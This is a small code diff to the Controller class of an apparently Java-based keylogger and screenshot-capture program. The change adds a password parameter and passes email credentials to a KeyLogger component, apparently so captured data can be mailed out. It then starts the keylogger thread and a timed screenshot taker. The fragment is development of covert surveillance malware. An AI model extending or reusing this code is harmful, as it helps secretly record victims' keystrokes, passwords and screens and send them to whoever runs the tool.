@@ -35,13 +35,14 @@ public class Controller {
 
     }
 
-    public Controller(String interval, String email){
+    public Controller(String interval, String email, String password){
 
         System.out.println(this);
         keyLogger = new KeyLogger();
         keyLogger.setCon(this);
+        keyLogger.setCredentials(email,password);
         photographer = new Screenshot(interval);
-
+        System.out.println("using second initalizer");
         Thread t = new Thread(keyLogger);
         t.start();
 
